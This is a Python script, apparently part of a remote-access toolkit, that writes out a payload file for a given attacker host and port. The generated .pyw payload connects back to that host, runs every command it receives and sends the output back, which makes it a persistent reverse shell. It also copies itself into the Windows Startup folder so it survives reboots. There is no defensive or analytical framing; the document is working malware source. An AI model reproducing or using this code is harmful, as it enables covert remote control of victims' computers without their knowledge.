import sys
import os

LHOST = sys.argv[1]
LPORT = int(sys.argv[2])

payload = f"""
import socket
import threading
import sys
import time
import os
import subprocess as sp
LHOST = "{LHOST}"
LPORT = {LPORT}

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

def checkConnection():
    try:
        client.send('')
    except:
        TryAgain()
    time.sleep(20)

def TryAgain():
    while True:
        try:
            client.connect((LHOST,LPORT))
            Cont()
            break
        except:
            pass

def Cont():
    def getCommand():
        while True:
           # try:
            try:
                msg = client.recv(2048).decode()
                output = sp.getoutput(msg)
                if msg.startswith('cd') and msg != 'cd':
                    os.chdir(msg.split(' ')[1])
                elif msg.split(' ')[0] in commands:
                    pass
                    #TODO COMMANDS
                else:
                    client.send(output.encode())
            except:
                pass

            #except:
              #  print('Error')

    def sendConnection():     
        client.send('NEW CLIENT CONNECTED!'.encode())
    commandThread = threading.Thread(target=getCommand)
    commandThread.start()
    sendConnection()
tryagainthread = threading.Thread(target=TryAgain)
tryagainthread.start()
checkConnectionThread = threading.Thread(target=checkConnection)
checkConnectionThread.start()
username = os.getlogin()
os.system(f'COPY "'+sys.argv[0]+'" "C:/Users/'+username+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"')
    

"""
write = open('Payloads/Generated/payload.pyw','w')
write.write(payload)
write.close()
